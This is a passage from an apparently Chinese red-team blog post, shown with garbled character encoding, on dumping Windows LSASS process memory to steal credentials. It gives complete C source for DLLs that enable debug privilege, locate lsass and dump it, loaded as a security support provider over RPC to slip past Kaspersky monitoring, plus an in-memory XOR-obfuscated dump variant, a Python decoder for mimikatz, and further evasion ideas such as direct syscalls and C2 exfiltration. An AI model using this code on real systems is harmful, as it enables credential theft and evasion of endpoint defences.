<figure data-type="image" tabindex="8"><img src="https://i.loli.net/2021/03/27/DldwTOUJGg4nWhr.png" alt="https://i.loli.net/2021/03/27/DldwTOUJGg4nWhr.png" loading="lazy"></figure>
<h3 id="3-é€šè¿‡rpcåŠ è½½ssp">(3) é€šè¿‡RPCåŠ è½½SSP</h3>
<blockquote>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>å¯ä»¥ç»•è¿‡æ€è½¯å¯¹lsassçš„ç›‘æ§</li>
<li>å¯ä»¥åŠ è½½mimilibæ¥è®°å½•å¯†ç ä»¥åº”å¯¹ç‰ˆæœ¬å¤§äºç­‰äºWindows Server 2012çš„æƒ…å†µ</li>
<li>ä¸éœ€è¦é‡å¯æœåŠ¡å™¨</li>
<li>ä¸éœ€è¦å†™æ³¨å†Œè¡¨</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>å› ä¸ºæ²¡æœ‰å†™æ³¨å†Œè¡¨ï¼Œæ‰€ä»¥æ— æ³•æŒä¹…åŒ–ï¼Œå¦‚æœç›®æ ‡æœºå™¨é‡å¯çš„è¯å°†æ— æ³•è®°å½•å¯†ç ï¼ˆå› æ­¤ä¸ªäººè®¤ä¸ºæ¯”è¾ƒé€‚åˆåœ¨Serverä¸Šç”¨ï¼Œä¸é€‚åˆåœ¨PCä¸Šç”¨ï¼‰</li>
</ul>
</blockquote>
<p>å¯ä»¥å‚è€ƒxpnå…³äºmimikatzçš„ç³»åˆ—æ–‡ç« ï¼š</p>
<p><a href="https://blog.xpnsec.com/exploring-mimikatz-part-1/">exploring-mimikatz-part-1</a></p>
<p><a href="https://blog.xpnsec.com/exploring-mimikatz-part-2/">exploring-mimikatz-part-2</a></p>
<p>åŸç†ç®€å•çš„æ¥è®²å°±æ˜¯ï¼Œxpnå‘ç°<code>AddSecurityPackage()</code>åœ¨è¢«è°ƒç”¨æ—¶ä¼šä½¿ç”¨RPCï¼ˆxpnçš„åŸæ–‡ä¸­è¯´åˆ°ï¼šè¿™æ˜¯æœ‰é“ç†çš„ï¼Œå› ä¸ºè¿™ä¸€è°ƒç”¨éœ€è¦å‘lsasså‘å‡ºä¿¡å·æ¥è¡¨æ˜éœ€è¦åŠ è½½æ–°çš„SSPï¼‰</p>
<p>å› æ­¤å¯ä»¥é€šè¿‡è°ƒè¯•è·å–ä¼ é€’ç»™RPCçš„æ•°æ®ï¼Œè¿›è€Œå¯ä»¥å‘èµ·RPCè°ƒç”¨ï¼Œè€Œä¸ç”¨ä½¿ç”¨<code>AddSecurityPackage()</code>è¿™ä¸ªAPIå»è°ƒç”¨</p>
<p>åŠ è½½çš„dllå¯ä»¥æ˜¯ç›´æ¥dump lsassçš„ï¼Œä¹Ÿå¯ä»¥æ˜¯åŠ è½½mimilibè¿™ç§è®°å½•å¯†ç çš„</p>
<figure data-type="image" tabindex="9"><img src="https://i.loli.net/2021/03/27/l57ZiWOAbNYfId8.png" alt="https://i.loli.net/2021/03/27/l57ZiWOAbNYfId8.png" loading="lazy"></figure>
<h2 id="0x01-å®ç°">0x01 å®ç°</h2>
<p>ä¸€äº›Dump Lsassæ–¹æ³•oræŠ€å·§çš„ç®€å•å®ç°ï¼Œä»¥åŠå®æˆ˜ä¸­çš„ä¸€äº›ä¼˜åŒ–</p>
<h3 id="1-ç¼–å†™dump-lsassçš„dll">1. ç¼–å†™Dump Lsassçš„DLL</h3>
<p>éœ€è¦ä»¥ä¸‹å‡ æ­¥æ“ä½œï¼š</p>
<ol>
<li>è·å–Debugæƒé™</li>
<li>æ‰¾åˆ°lsassçš„PID</li>
<li>ä½¿ç”¨MiniDumpæˆ–MiniDumpWriteDumpè¿›è¡Œå†…å­˜dump</li>
</ol>
<p>è¿™ä¸ªé€»è¾‘å¾ˆç®€å•ï¼Œå…¶ä¸­è·å–debugæƒé™å’Œè‡ªåŠ¨å¯»æ‰¾lsassçš„PIDç½‘ä¸Šä¹Ÿæœ‰ä¸å°‘çš„Demoï¼Œæ‰€ä»¥å¾ˆå¥½å®ç°</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;Windows.h&gt;
#include &lt;tlhelp32.h&gt;

typedef HRESULT(WINAPI* _MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline);

int GetLsassPid() {

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(hSnapshot, &amp;entry)) {
		while (Process32Next(hSnapshot, &amp;entry)) {
			if (wcscmp(entry.szExeFile, L&quot;lsass.exe&quot;) == 0) {
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(hSnapshot);
	return 0;
}

void GetDebugPrivilege()
{
	BOOL fOk = FALSE;
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = true ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
}

void DumpLsass()
{
	wchar_t  ws[100];
	_MiniDumpW MiniDumpW;
	
	MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L&quot;comsvcs.dll&quot;), &quot;MiniDumpW&quot;);
	swprintf(ws, 100, L&quot;%u %hs&quot;, GetLsassPid(), &quot;c:\\windows\\temp\\temp.bin full&quot;);

	GetDebugPrivilege();

	MiniDumpW(0, 0, ws);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		DumpLsass();
		break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
</code></pre>
<p>æˆ‘ä»¬å…ˆæ‹¿rundll32æµ‹è¯•ä¸€ä¸‹ï¼ŒæˆåŠŸdumpäº†lsassè¿›ç¨‹ï¼š</p>
<figure data-type="image" tabindex="10"><img src="https://i.loli.net/2021/03/27/NiSnL7O3KIzXBa1.png" alt="https://i.loli.net/2021/03/27/NiSnL7O3KIzXBa1.png" loading="lazy"></figure>
<p>ç„¶åä½¿ç”¨åˆ©ç”¨RPCåŠ è½½SSPçš„æ–¹å¼æ¥è½¬å‚¨lsassçš„è¿›ç¨‹å†…å­˜ï¼š</p>
<figure data-type="image" tabindex="11"><img src="https://i.loli.net/2021/03/27/aNelHhgcySV5RJo.png" alt="https://i.loli.net/2021/03/27/aNelHhgcySV5RJo.png" loading="lazy"></figure>
<p>æˆåŠŸç»•è¿‡å¡å·´æ–¯åŸºå¯¹lsassçš„ç›‘æ§</p>
<h3 id="2-å°†dllä¸exeæ–‡ä»¶æ‰“åŒ…">2. å°†DLLä¸EXEæ–‡ä»¶æ‰“åŒ…</h3>
<p>æˆ‘ä»¬åœ¨ä½¿ç”¨è¯¥æ–¹æ³•æ—¶éœ€è¦ä¸Šä¼ exeå’Œdllï¼Œå¹¶ä¸”XPNåŸç‰ˆçš„ä»£ç éœ€è¦å°†SSP DLLçš„ç»å¯¹è·¯å¾„ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œåœ¨ä½¿ç”¨æ—¶éå¸¸ä¸æ–¹ä¾¿</p>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥å°†DLLæ”¾å…¥exeçš„èµ„æºèŠ‚åŒºï¼Œç„¶ååœ¨è¿è¡Œæ—¶é‡Šæ”¾åˆ°ç¨‹åºæ‰€åœ¨ç›®å½•ï¼ŒåŠ è½½å®Œæˆåå†åˆ é™¤DLL</p>
<p>æˆåŠŸdump lsassè¿›ç¨‹çš„å†…å­˜ï¼š</p>
<figure data-type="image" tabindex="12"><img src="https://i.loli.net/2021/03/27/cDC86MSWHNRqFZ2.png" alt="https://i.loli.net/2021/03/27/cDC86MSWHNRqFZ2.png" loading="lazy"></figure>
<p>å…³äºå°†æ–‡ä»¶æ·»åŠ åˆ°èµ„æºåŒºå¹¶é‡Šæ”¾å¯ä»¥å‚è€ƒï¼š<a href="https://blog.csdn.net/dengdao1372/article/details/101230640">C++å®ç°ç¬¬ä¸‰æ–¹èµ„æºé‡Šæ”¾ä¸è½½å…¥è¿‡ç¨‹ï¼ˆä»¥DLLä¸ºä¾‹ï¼‰</a></p>
<h3 id="3-å°†è¿›ç¨‹dumpåˆ°å†…å­˜">3. å°†è¿›ç¨‹dumpåˆ°å†…å­˜</h3>
<p>éƒ¨åˆ†AV/EDRä¼šç›‘æ§æˆ‘ä»¬dumpä¸‹æ¥çš„è¿›ç¨‹è½¬å‚¨æ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬æœ‰æ—¶éœ€è¦å°†è¿›ç¨‹dumpåˆ°ä¸€å—å†…å­˜ä¸­ï¼Œè¿›è¡ŒåŠ å¯†åå†å†™å…¥ç£ç›˜ï¼Œæˆ–è€…ç›´æ¥é€šè¿‡ç½‘ç»œè¿›è¡Œä¼ è¾“</p>
<p>ä¸»è¦åˆ©ç”¨çš„æ˜¯<code>MiniDumpWriteDump</code>çš„å›è°ƒå‡½æ•°æ¥å®ç°è¯¥æ“ä½œ</p>
<p>æˆ‘è¿™é‡Œå€Ÿé‰´äº†<code>@ired.team</code>çš„ä»£ç ï¼ˆ<a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass#minidumpwritedump-to-memory-using-minidump-callbacks">æ–‡ç« æˆ³è¿™é‡Œ</a>ï¼‰ï¼Œå¹¶åœ¨å†…å­˜ä¸­å¯¹è¿›ç¨‹è½¬å‚¨æ•°æ®è¿›è¡Œä¸<code>0x32</code>çš„æŒ‰ä½å¼‚æˆ–ï¼Œé€šè¿‡ç¼–è¯‘ä¸ºdllç„¶åä½¿ç”¨rundll32åŠ è½½</p>
<pre><code class="language-c">// dllmain.cpp : Defines the entry point for the DLL application.
#include &quot;pch.h&quot;
#include &lt;windows.h&gt;
#include &lt;DbgHelp.h&gt;
#include &lt;iostream&gt;
#include &lt;TlHelp32.h&gt;
#include &lt;processsnapshot.h&gt;
#pragma comment (lib, &quot;Dbghelp.lib&quot;)

LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
DWORD bytesRead = 0;

int GetLsassPid() {

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(hSnapshot, &amp;entry)) {
		while (Process32Next(hSnapshot, &amp;entry)) {
			if (wcscmp(entry.szExeFile, L&quot;lsass.exe&quot;) == 0) {
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(hSnapshot);
	return 0;
}

void GetDebugPrivilege()
{
	BOOL fOk = FALSE;
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = true ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
}

BOOL CALLBACK minidumpCallback(
	__in     PVOID callbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput-&gt;CallbackType)
	{
	case IoStartCallback:
		callbackOutput-&gt;Status = S_FALSE;
		break;

		// Gets called for each lsass process memory read operation
	case IoWriteAllCallback:
		callbackOutput-&gt;Status = S_OK;

		// A chunk of minidump data that's been jus read from lsass. 
		// This is the data that would eventually end up in the .dmp file on the disk, but we now have access to it in memory, so we can do whatever we want with it.
		// We will simply save it to dumpBuffer.
		source = callbackInput-&gt;Io.Buffer;

		// Calculate location of where we want to store this part of the dump.
		// Destination is start of our dumpBuffer + the offset of the minidump data
		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput-&gt;Io.Offset);

		// Size of the chunk of minidump that's just been read.
		bufferSize = callbackInput-&gt;Io.BufferBytes;
		bytesRead += bufferSize;

		RtlCopyMemory(destination, source, bufferSize);

		break;

	case IoFinishCallback:
		callbackOutput-&gt;Status = S_OK;
		break;

	default:
		return true;
	}
	return TRUE;
}

void DumpLsass()
{
	DWORD lsassPID = GetLsassPid();
	DWORD bytesWritten = 0;
	
	// Set up minidump callback
	MINIDUMP_CALLBACK_INFORMATION callbackInfo;
	ZeroMemory(&amp;callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	callbackInfo.CallbackRoutine = &amp;minidumpCallback;
	callbackInfo.CallbackParam = NULL;

	GetDebugPrivilege();

	HANDLE lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
	// Dump lsass
	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &amp;callbackInfo);

	for (DWORD i = 0; i &lt; bytesRead; i++)
	{
		*((BYTE*)dumpBuffer + i) ^= 0x32;
	}

	// At this point, we have the lsass dump in memory at location dumpBuffer - we can do whatever we want with that buffer, i.e encrypt &amp; exfiltrate
	HANDLE outFile = CreateFile(L&quot;c:\\temp\\temp.bin&quot;, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// For testing purposes, let's write lsass dump to disk from our own dumpBuffer and check if mimikatz can work it
	WriteFile(outFile, dumpBuffer, bytesRead, &amp;bytesWritten, NULL);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		DumpLsass();
		break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
</code></pre>
<p>æœ€ç»ˆå¾—åˆ°çš„temp.binå¦‚ä¸‹ï¼Œå·¦è¾¹æ˜¯ä½¿ç”¨procdumpå¾—åˆ°çš„æœªåŠ å¯†çš„è¿›ç¨‹è½¬å‚¨æ–‡ä»¶ï¼š</p>
<figure data-type="image" tabindex="13"><img src="https://i.loli.net/2021/03/27/5ZCMUO7PJfn2YEj.png" alt="https://i.loli.net/2021/03/27/5ZCMUO7PJfn2YEj.png" loading="lazy"></figure>
<p>æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªpythonè„šæœ¬æ¥å°†æ–‡ä»¶è§£å¯†å›æ¥</p>
<pre><code class="language-c">with open(&quot;C:\\Temp\\temp.bin&quot;, &quot;rb&quot;) as f1:
    with open(&quot;C:\\Temp\\temp2.bin&quot;, &quot;ab&quot;) as f2:
        data = f1.read()
        print(len(data))
        for i in range(len(data)):
            newData = 0x32 ^ data[i]
            f2.write(bytes([newData]))
</code></pre>
<p>å¯ä»¥ä½¿ç”¨mimikatzæˆåŠŸè¯»å–ï¼š</p>
<figure data-type="image" tabindex="14"><img src="https://i.loli.net/2021/03/27/dxlhDWC9e8T1pfA.png" alt="https://i.loli.net/2021/03/27/dxlhDWC9e8T1pfA.png" loading="lazy"></figure>
<h3 id="4-x86ç¯å¢ƒä¸‹åˆ©ç”¨rpcåŠ è½½ssp">4. x86ç¯å¢ƒä¸‹åˆ©ç”¨RPCåŠ è½½SSP</h3>
<p><strong>TODO</strong></p>
<h3 id="5-å…¶å®ƒå¯èƒ½ç”¨åˆ°çš„ä¼˜åŒ–æ€è·¯">5. å…¶å®ƒå¯èƒ½ç”¨åˆ°çš„ä¼˜åŒ–æ€è·¯</h3>
<ol>
<li>Dumpè¿›ç¨‹çš„æ•æ„ŸAPIé€šè¿‡åŠ¨æ€è°ƒç”¨/API HashingæŠ€æœ¯æ¥è§„é¿é™æ€æ£€æµ‹</li>
<li>ç¼–å†™è‡ªå·±çš„dumpå‡½æ•°ï¼Œéƒ¨åˆ†æ•æ„ŸAPIä½¿ç”¨Direct Syscall</li>
<li>ä¸C2ç»“åˆï¼Œdumpçš„æ–‡ä»¶/è¯»å–çš„hashç›´æ¥å›ä¼ </li>
</ol>
<h2 id="0x02-å¯èƒ½é‡åˆ°çš„é—®é¢˜">0x02 å¯èƒ½é‡åˆ°çš„é—®é¢˜</h2>
<h3 id="1-ç¼ºå°‘vcè¿è¡Œåº“">1. ç¼ºå°‘VCè¿è¡Œåº“</h3>
<p>åœ¨æŸæ¬¡æˆæƒæ¸—é€æµ‹è¯•ä¸­ï¼Œå‡ºç°ç›®æ ‡æœºå™¨ç¼ºå¤±VCè¿è¡Œåº“çš„é—®é¢˜ï¼š</p>
<figure data-type="image" tabindex="15"><img src="https://i.loli.net/2021/03/27/1S7h2u8WyB3vrbJ.png" alt="https://i.loli.net/2021/03/27/1S7h2u8WyB3vrbJ.png" loading="lazy"></figure>
<p>è®¾ç½®é¡¹ç›®ä¸ºé™æ€é“¾æ¥ç¨‹åºæ‰€éœ€è¦çš„è¿è¡Œåº“å³å¯ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<figure data-type="image" tabindex="16"><img src="https://i.loli.net/2021/03/27/azJCfiHu5sU2yDF.png" alt="https://i.loli.net/2021/03/27/azJCfiHu5sU2yDF.png" loading="lazy"></figure>
<p>æˆåŠŸè¿è¡Œï¼Œç›®æ ‡ç¯å¢ƒä¸­å­˜åœ¨å¡å·´æ–¯åŸºEDRï¼Œæœ€ç»ˆæˆåŠŸdump lsass</p>
<figure data-type="image" tabindex="17"><img src="https://i.loli.net/2021/03/27/3he96KZ1BRUNAn2.png" alt="https://i.loli.net/2021/03/27/3he96KZ1BRUNAn2.png" loading="lazy"></figure>
<h3 id="2-dumpæ–‡ä»¶ä½“ç§¯è¿‡å¤§">2. dumpæ–‡ä»¶ä½“ç§¯è¿‡å¤§</h3>
<p>æœ‰æ—¶æˆ‘ä»¬å¯èƒ½ä¼šæ‰“åˆ°ä¸å‡ºç½‘çš„æœåŠ¡å™¨ï¼Œè€Œæ­¤æ—¶æˆ‘ä»¬åˆæ²¡æœ‰ç¨³å®šçš„ä»£ç†ï¼ˆRegeorgè¿™äº›é€Ÿåº¦å¤ªæ…¢ï¼‰ï¼Œä»…ä»…æœ‰ä¸€ä¸ªwebshellæ¥ä¸‹è½½å¤§äº30Mçš„æ–‡ä»¶æ˜¯ååˆ†ä¸ç¨³å®šçš„</p>
<p>ä¸ªäººä¸€èˆ¬çš„æ€è·¯å°±æ˜¯ï¼š</p>
<ul>
<li>å…æ€mimikatzæˆ–æå–sekurlsaæ¨¡å—ï¼Œå°†å·¥å…·ä¼ ä¸Šå»è¯»</li>
<li>ä¸Šä¼ 7z.exe&amp;&amp;7z.dllï¼Œå°†æ–‡ä»¶è¿›è¡Œåˆ†å·å‹ç¼©å†ä¸‹è½½</li>
</ul>
<p>ä¹Ÿæƒ³è¿‡ç›´æ¥æŠŠè¯»å–çš„åŠŸèƒ½å†™å…¥SSP DLLé‡Œï¼Œç„¶åç»“æœè¾“å‡ºåˆ°ç£ç›˜ï¼Œä½†è¿˜æœªè¿›è¡Œå°è¯•ï¼Œå…ˆç®—ä½œä¸€ç§æ€è·¯å§</p>
<h2 id="0x03-æ€»ç»“">0x03 æ€»ç»“</h2>
<ul>
<li>æ— æ€è½¯éšä¾¿ç©ï¼Œç›´æ¥mimikatzä¸Šå»è¯»å°±æ˜¯</li>
<li>æ— ç›‘æ§lsassçš„AV/EDRï¼Œå¯ä»¥é€šè¿‡å…æ€mimikatzè¿›è¡Œç›´æ¥è¯»å–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç™½åå•ç¨‹åºè¿›è¡Œdumpï¼ˆéœ€è¦æ³¨æ„éƒ¨åˆ†æ€è½¯ä¼šå¯¹ç™½åå•ç¨‹åºæŠ¥è­¦ï¼‰</li>
<li>å¦‚æœæ˜¯å¡å·´è¿™ç§ç›‘æ§lsassçš„ï¼Œæœ€å¥½æ˜¯ä½¿ç”¨åŠ è½½SSPçš„æ–¹å¼ï¼Œä¼˜ç¼ºç‚¹å‚è€ƒå‰é¢çš„ï¼Œå¯ä»¥æ ¹æ®ä¸åŒæƒ…å†µä½¿ç”¨ä¸åŒçš„æ–¹æ³•</li>
</ul>

                                </div>
                            </div>
                            
                        </div>
                        <div class="post-footer">
                            <div class="post-copyright">
                                ä½œè€…:
                                ğŸ³æ¯…ç§å¾ªç¯<br>æ°¸ä¹…é“¾æ¥:
                                    <a href="https://redteamblog.icu/post/41016eb03b2343a69a9be35f251f1e9c/" title="ä¸€äº›è·å–Windowsæ˜æ–‡å‡­æ®çš„æ–¹æ³•">
                                        https://redteamblog.icu/post/41016eb03b2343a69a9be35f251f1e9c/
                                    </a><br> åè®®: MIT License
                            </div>
                        </div>
                    </article>
                </div>
                <style>
                    .prev:hover {
                        color: #2d96bd;
                        text-decoration: none;
                        text-align: center;
                        transition: color 0.2s ease, border-color 0.2s ease, background 0.2s ease, opacity 0.2s ease;
                    }
                    
                    .next:hover {
                        color: #2d96bd;
                        text-decoration: none;
                        text-align: center;
                        transition: color 0.2s ease, border-color 0.2s ease, background 0.2s ease, opacity 0.2s ease;
                    }
                </style>
                <div class="lite-item nearby-article">
                    
                        <div class="nearby-article-left" style="padding: 10px;">
                            <a class="prev" rel="prev" href="https://redteamblog.icu/post/gongyingshangmanyou/">
                                <i class="fa fa-chevron-left"></i>
                                è®°ä¸€æ¬¡ä¾›åº”å•†åˆ°ç›®æ ‡ä¹‹æ—…
                            </a>
                        </div>
                        
                            
                                <div class="nearby-article-right" style="padding: 10px;">
                                    <a class="next" rel="next" href="https://redteamblog.icu/post/kerberos/">
                                        Kerberosè®¤è¯åè®®å­¦ä¹ <i class="fa fa-chevron-right"></i>
                                    </a>
                                </div>
                                
                </div>
                <!--Share-->
                <span style="margin-right:15px">
    <i class="post-share"></i>
    <span>&#x5206;&#x4EAB;:</span>
                <a title="QR ç " target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://redteamblog.icu/post/41016eb03b2343a69a9be35f251f1e9c/"><i class="fa fa-qrcode"></i></a>
                <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://redteamblog.icu/post/41016eb03b2343a69a9be35f251f1e9c/&sharesource=qzone&title=ä¸€äº›è·å–Windowsæ˜æ–‡å‡­æ®çš„æ–¹æ³•&pics=https://redteamblog.icu/images/avatar.png?v=1653964744272&summary="><i class="fa fa-qq"></i></a>
                <a title="æ–°æµªå¾®åš" target="_blank" href="https://service.weibo.com/share/share.php?url=https://redteamblog.icu/post/41016eb03b2343a69a9be35f251f1e9c/&sharesource=weibo&title=ä¸€äº›è·å–Windowsæ˜æ–‡å‡­æ®çš„æ–¹æ³• + " - " + &pic="https://redteamblog.icu/images/avatar.png?v=1653964744272"><i class="fa fa-weibo "></i></a>
                </span>
                
                                            
                                                <script type="application/javascript" src="//unpkg.com/valine@latest/dist/Valine.min.js"></script>
<div id="vlaine-comment"></div>
<script type="application/javascript">
    new Valine({
        el: '#vlaine-comment',
        appId: 'Ik52EhrTkYU8moKHOkLSm7bp-gzGzoHsz',
        appKey: 'o582DpzvYHyL0Gpu3SaatYO7',
        pageSize: 10,
        avatar: 'mp',
        placeholder: 'æ¥éƒ½æ¥äº†ï¼Œä¸å¦¨è¯„è®ºä¸€ä¸‹',
        visitor: true,
        highlight: true,
        recordIP: true,
    })
</script>
                                                    
            </div>
            <div id="sidebar">
    <ul>
        
            <li class="lite-item">
                <header class="lite-item-header">
                    <h3 class="lite-item-title"><i class="Card Card-hitokoto"></i>&nbsp;&#x4E00;&#x8A00;</h3>
                </header>
                <div class="textwidget">
                    <p>
                        <b id="hitokoto"></b>
                    </p>
                </div>
            </li>
            
                <!--
                <li class="lite-item">
                    <header class="lite-item-header">
                        <h3 class="lite-item-title"><i class="Card Card-tags">&#x6807;&#x7B7E;</i></h3>
                    </header>
                    <div class="textwidget">
                        
                            <a href="" class="tag-cloud-link " style="font-size: 12px;margin: 5px; padding: 2px;">
                                <i class="fa fa-tags" aria-hidden="true"></i>
                            </a>
                            
                    </div>
                </li>-->
                <li class="lite-item">
                    <header class="lite-item-header">
                        <h3 class="lite-item-title"><i class="Card Card-tags">&#x6807;&#x7B7E;</i></h3>
                    </header>
                    <div class="textwidget">
                        <div id='tags' style="height: auto;width: 360;"></div>
                        <script src="https://redteamblog.icu/media/js/svg3dtagcloud.min.js"></script>
                        <script>
                            $(document).ready(function() {
                                var entries = ([
                                    
                                     {
                                        label: 'ğŸ·éšç¬”',
                                        url: 'https://redteamblog.icu/tag/wQ9CEdhmu/',
                                        target: '_button'
                                    },
                                    
                                    
                                     {
                                        label: 'ğŸ·å†…ç½‘æ¸—é€',
                                        url: 'https://redteamblog.icu/tag/McUKTZjbK/',
                                        target: '_button'
                                    },
                                    
                                    
                                     {
                                        label: 'ğŸ·æ¸—é€æµ‹è¯•',
                                        url: 'https://redteamblog.icu/tag/-uEIOBB-D/',
                                        target: '_button'
                                    },
                                    
                                    
                                     {
                                        label: 'ğŸ·ææƒ',
                                        url: 'https://redteamblog.icu/tag/getsystem/',
                                        target: '_button'
                                    }
                                    
                                    
                                ]);
                                var settings = {
                                    entries: entries, //æ•°æ®
                                    width: 300, //å®½åº¦
                                    height: 300, //é«˜åº¦
                                    radius: '50%',
                                    radiusMin: 50,
                                    bgDraw: false, //æ˜¯å¦æ˜¾ç¤ºèƒŒæ™¯
                                    bgColor: '#fff', //èƒŒæ™¯é¢œè‰²
                                    opacityOver: 1.00,
                                    opacityOut: 0.05,
                                    opacitySpeed: 6,
                                    fov: 360,
                                    speed: 0.3, //æ—‹è½¬çš„é€Ÿåº¦
                                    fontFamily: 'Oswald, Arial, sans-serif',
                                    fontSize: '18', //é»˜è®¤å­—ä½“å¤§å°
                                    fontColor: '#666', //é»˜è®¤å­—ä½“é¢œè‰²
                                    fontWeight: 'normal', //bold
                                    fontStyle: 'normal', //italic 
                                    fontStretch: 'normal', //wider, narrower, ultra-condensed, extra-condensed, condensed, semi-condensed, semi-expanded, expanded, extra-expanded, ultra-expanded
                                    fontToUpperCase: true,
                                    tooltipFontFamily: 'Oswald, Arial, sans-serif',
                                    tooltipFontSize: '16',
                                    tooltipFontColor: 'red',
                                    tooltipFontWeight: 'normal', //bold
                                    tooltipFontStyle: 'normal', //italic 
                                    tooltipFontStretch: 'normal', //wider, narrower, ultra-condensed, extra-condensed, condensed, semi-condensed, semi-expanded, expanded, extra-expanded, ultra-expanded
                                    tooltipFontToUpperCase: false,
                                    tooltipTextAnchor: 'left',
                                    tooltipDiffX: 0,
                                    tooltipDiffY: 5

                                };

                                //var svg3DTagCloud = new SVG3DTagCloud( document.getElementById( 'holder'  ), settings );
                                $('#tags').svg3DTagCloud(settings);
                            });
                        </script>
                    </div>
                </li>
                
                                
                                    
                                        
                                            <li class="lite-item">
                                                <header class="lite-item-header">
                                                    <h3 class="lite-item-title">
                                                        
                                                    </h3>
                                                </header>
                                                <div class="textwidget">
                                                    <div id="textwidget-box" style="width:100%; height:auto;">
                                                        
                                                    </div>
                                                </div>
                                            </li>
                                            
                                                
                                                    <li class="lite-item">
                                                        <header class="lite-item-header">
                                                            <h3 class="lite-item-title">&#x1F468;&#x200D;&#x1F4BB;&#x53CB;&#x94FE;</h3>
                                                        </header>
                                                        <div class="textwidget">
                                                            
                                                                
                                                                    <p onclick="javascript:top.location='https://www.cooyf.com'"><span class="link_a"><a href="https://www.cooyf.com" alt="å›½æœç¬¬ä¸€ç¼åˆæ€ª ">å›½æœç¬¬ä¸€ç¼åˆæ€ª -ç¼åˆè¶…äºº</a></span></p>

                                                                    
                                                                        
                                                        </div>
                                                    </li>
    </ul>
</div>
        </div>

</body>
<footer id="foot">
    <a class="back-to-top" href="#"><i class="Card Card-top" ></i><span class="back-to-top-text">0%</span></a>
    <div class="copyright">
        
            
                    

                        <div style="font-size:12px">
                            
                                        å·²ç»å»ºç«™ <b id='build_time'></b>
                        </div>
                        <script src="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io/CDN/js/time.min.js"></script>
                        <script>
                            buildTime = '2022-04-23'
                            setInterval(show_date_time, 1000, buildTime);
                        </script>
                        
                            <a href="https://blog.itjoker.cn">
                                Theme - Card
                            </a>&nbsp;|&nbsp; &#x7248;&#x6743;&#x6240;&#x6709; &copy;
                            <script>
                                var date = new Date();
                                data2 = new Date(buildTime.replace(/-/g, "/"));
                                nowYear = date.getFullYear().toString()
                                buildYear = data2.getFullYear().toString();
                                if (buildYear == nowYear) {
                                    document.write('<span class="my-face">' + nowYear + '</span>');
                                } else {
                                    document.write(buildYear + '-<span class="my-face">' + nowYear + '</span>');
                                }
                            </script>

                            <a href="https://redteamblog.icu">
                                ğŸ³æ¯…ç§å¾ªç¯
                            </a>&nbsp;|&nbsp;Powered by
                            <a href="https://redteamblog.icu" target="_blank">
                                æ´—å‰‘å½•
                            </a>
